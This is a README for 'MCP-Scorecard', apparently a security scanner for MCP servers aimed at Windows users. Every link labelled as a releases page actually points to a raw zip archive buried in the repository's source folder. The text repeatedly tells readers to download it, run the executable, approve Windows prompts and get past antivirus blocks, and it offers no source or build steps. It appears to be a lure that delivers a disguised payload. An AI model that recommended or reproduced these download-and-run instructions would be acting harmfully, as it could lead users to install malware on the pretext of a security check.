# 🛡️ MCP-Scorecard - Surface Risk for MCP Servers

[![Download MCP-Scorecard](https://img.shields.io/badge/Download%20MCP--Scorecard-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)

## 📌 What this is

MCP-Scorecard scans MCP servers and gives each one a clear risk score. It is built for Windows users who want a simple way to check server safety before they use it in a build or agent setup.

It helps you:

- scan MCP server setups
- find common security risks
- review trust signals in a clear report
- use the same check each time in CI
- compare servers with a repeatable score

## 💻 What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- an internet connection
- enough free space for the app and scan reports
- permission to run downloaded files

You do not need to know how to code to use the release version.

## ⬇️ Download MCP-Scorecard

Visit this page to download the latest release for Windows:

[Download MCP-Scorecard from GitHub Releases](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)

On the releases page, look for the newest version and choose the Windows file if one is listed. Save it to your PC, then open it after the download finishes.

## 🧭 Install and run

Follow these steps:

1. Open the [releases page](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
2. Find the latest release at the top of the page
3. Look for a Windows download file
4. Download the file to your computer
5. If the file comes in a zip folder, unzip it first
6. Double-click the app or executable file
7. If Windows asks for approval, choose the option to run it
8. Wait for the app to start
9. Open your MCP server config or target path in the app
10. Start a scan and wait for the report

If the app opens a command window, keep it open until the scan ends.

## 🔎 What the scan checks

MCP-Scorecard reviews common risk areas in an MCP server setup, such as:

- exposed endpoints
- weak config settings
- unsafe tool access
- missing checks for file or network use
- patterns that can raise trust risk
- signs that may affect CI use

It then gives you a score so you can compare servers in a simple way.

## 📄 What you get

After a scan, you can expect:

- a risk score
- a short list of findings
- a clear view of high-risk items
- a result you can share with your team
- output that works well in CI logs

If you use it in a pipeline, the tool can help you catch problems before they reach later stages.

## 🛠️ How to use it in simple terms

Use MCP-Scorecard when you want to check an MCP server before you trust it.

A common flow looks like this:

1. Download the release
2. Run the app on Windows
3. Select the MCP server you want to check
4. Start the scan
5. Review the score and findings
6. Fix any issues you find
7. Run the scan again

That gives you a repeatable check for each server version.

## 🧪 Best times to run a scan

Run MCP-Scorecard when:

- you add a new MCP server
- you update an existing server
- you prepare a server for CI use
- you review third-party server code
- you want a quick trust check before rollout

## 📁 Example use cases

MCP-Scorecard fits well when you want to:

- check a local MCP server before connecting it to an agent
- review server risk in a devsecops workflow
- add a security gate in CI
- compare several servers before choosing one
- keep a steady trust score across releases

## ⚙️ Common setup tips

If the app does not start right away:

- try running it again as the same user who downloaded it
- keep the file in a simple folder like Downloads or Desktop
- avoid moving files while the scan is running
- make sure your Windows user has access to the target files
- check that your antivirus did not block the download

If you use a zip file, extract all files before you run the app.

## 🔐 Security review areas

The tool is built for surface-risk scoring, so it focuses on the parts of an MCP server that matter most for trust:

- access control
- tool exposure
- input handling
- file and path use
- network behavior
- config hygiene
- repeatable scan results

This makes it useful for teams that want a steady security check without a long manual review.

## 🧰 For CI use

MCP-Scorecard is made for CI jobs as well as local checks.

In a CI setup, it can:

- run the same scan every time
- flag risky changes early
- give a simple pass or fail result
- leave a report in the build logs
- support review before merge

That helps teams keep MCP servers in a safer state over time.

## 🧭 Where to start

If this is your first time using the app:

1. Visit the [releases page](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
2. Download the latest Windows release
3. Open the file on your PC
4. Scan one MCP server first
5. Read the score and findings
6. Repeat for other servers as needed

## 🖥️ Windows file handling

Windows may show a prompt after download. If that happens:

- choose the file from your Downloads folder
- right-click and open it if needed
- approve the run prompt if Windows asks
- wait for the scan to finish before closing the window

If you use a zip package, unzip it into its own folder first.

## 📊 Reading the score

The score gives you a quick view of server trust.

A lower score can mean more risk. A higher score can mean fewer issues. Use the findings list to see what needs attention, since the score alone does not show the full picture.

## 🧾 Simple workflow

A clean workflow looks like this:

- download the release
- run a scan
- review the report
- fix weak points
- scan again
- keep the result with your build record

That keeps your checks clear and easy to repeat.

## 📚 Project topics

MCP-Scorecard fits these areas:

- agentic AI
- CI/CD
- devsecops
- LLM agents
- MCP
- model context protocol
- Python
- security
- static analysis
- trust score

## 🧷 Helpful terms

- **MCP server**: a service that gives tools or data to an AI app
- **CI**: a build check that runs when code changes
- **Static analysis**: a review of files without running them
- **Risk score**: a number that shows how much concern the scan found
- **Surface risk**: the visible risk area a system exposes

## 📦 Download again later

When a new version is released, return to:

[https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)

Download the newest Windows file, then run the updated version the same way

## 🧩 Troubleshooting

If the scan does not start:

- check that the file finished downloading
- make sure you extracted the zip file
- confirm the file is not blocked by Windows
- try a different folder path with simple names
- restart the app and try again

If you do not see results:

- check that the server path is correct
- confirm the target server files still exist
- run one scan at a time
- open the report file if the app saves one

## 📎 Direct release link

[Visit the MCP-Scorecard releases page](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)

